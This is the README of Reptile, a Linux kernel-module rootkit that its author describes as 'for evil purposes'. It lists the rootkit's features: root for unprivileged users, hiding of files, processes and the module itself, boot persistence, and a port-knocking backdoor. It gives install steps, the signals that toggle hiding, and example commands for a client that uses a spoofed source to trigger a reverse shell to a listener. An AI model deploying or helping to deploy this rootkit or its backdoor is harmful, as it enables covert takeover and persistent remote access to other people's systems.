# Reptile

Reptile is a LKM rootkit for evil purposes. If you are searching stuff only for study purposes, see the [demonstration codes](https://github.com/f0rb1dd3n/papers/tree/master/rootkit_demonstration).

## Features

- Give root to unprivileged users
- Hide files and directories
- Hide files contents
- Hide processes
- Hide himself
- Boot persistence
- Heaven's door - A ICMP/UDP port-knocking backdoor
- Client to knock on heaven's door :D
    
## Install
```
apt-get install linux-headers-$(uname -r)
https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./installer.sh install
```
## Uninstall
```
kill -50 0
rmmod reptile_mod
./install.sh uninstall
```

## Usage

Binaries will be copied to `/reptile` folder, that will be hidden by Reptile.

### Getting root privileges

```
hax@Debian:~$ id
uid=1000(hax) gid=1000(hax) grupos=1000(hax),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth),118(scanner)
hax@Debian:~$ /reptile/r00t
You got super powers!

root@Debian:/home/hax# id
uid=0(root) gid=0(root) groups=0(root)
```

### Hiding

- Hide/unhide reptile module: `kill -50 0`
- Hide/unhide process: `kill -49 <PID>`
- Hide files contents: all content between the tags will be hidden

Example:
```
#<reptile> 
content to hide 
#</reptile>
```

### Knocking on heaven's door

Heaven's door is a ICMP/UDP port-knocking backdoor used by Reptile. To access the backdoor you can use the client: 
```
Knock Knock on Heaven's Door
Writen by: F0rb1dd3n

Usage: ./knock_on_heaven <args>

-x      protocol (ICMP/UDP)
-s      Source IP address (You can spoof)
-t      Target IP address
-p      Source Port
-q      Target Port
-d      Data to knock on backdoor: "<key> <reverse IP> <reverse Port>"
-l      Launch listener

[!] ICMP doesn't need ports

ICMP: ./knock_on_heaven -x icmp -s 192.168.0.2 -t 192.168.0.3 -d "F0rb1dd3n 192.168.0.4 4444" -l
UDP:  ./knock_on_heaven -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 53 -q 53 -d "F0rb1dd3n 192.168.0.4 4444" -l

```
<img src="https://i.imgur.com/UaChWK8.png">

## Disclaimer

Some functions of this module is based on another rootkits. Please see the references!

## References

- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;
- https://github.com/m0nad/Diamorphine.git
- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git
- https://github.com/maK-/maK_it-Linux-Rootkit
- “[Abuse of the Linux Kernel for Fun and Profit](http://phrack.org/issues/50/5.html)”, Halflife, Phrack 50, 1997;
- https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/

## Contributing

I am open to receiving contributions. If you can contribute with this project, discuss the contribution via e-mail or open an issue, fork the project and make a pull request. I will evaluate pull requests and merge to the project.
